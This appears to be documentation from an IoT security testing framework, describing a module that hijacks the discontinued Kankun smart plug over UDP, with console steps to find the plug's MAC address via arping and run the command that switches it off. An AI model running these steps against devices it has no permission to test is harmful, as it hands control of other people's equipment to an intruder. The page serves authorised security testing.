UDP
===

As of now all, UDP based proprietary communication will be grouped here.
Eventually, it will be changed to something else.

udp.kankun.hijack
-----------------

This is an exploit for a Smart plug called Kankun, manufactured by a Chinese
vendor ikonke.com. It is out of production now.

**Usage details:**

.. code-block:: console

   ef> run udp.kankun.hijack -h

Example
^^^^^^^

To run the plugin you need the IP address and the MAC address of the plug.
Let's assume that you know the IP address. In this example it's 192.168.10.253.
Get the MAC address with the IP address.

.. code-block:: console

   $ arping -f -I wlp4s0 192.168.10.253
   ARPING 192.168.10.253 from 192.168.10.110 wlp4s0
   Unicast reply from 192.168.10.253 [00:15:61:BD:49:CB]  35.143ms
   Sent 1 probes (1 broadcast(s))
   Received 1 response(s)

Run the test with the collected information.

.. code-block:: console

   ef> run udp.kankun.hijack -r 192.168.10.253 -m 00:15:61:BD:49:CB -c off
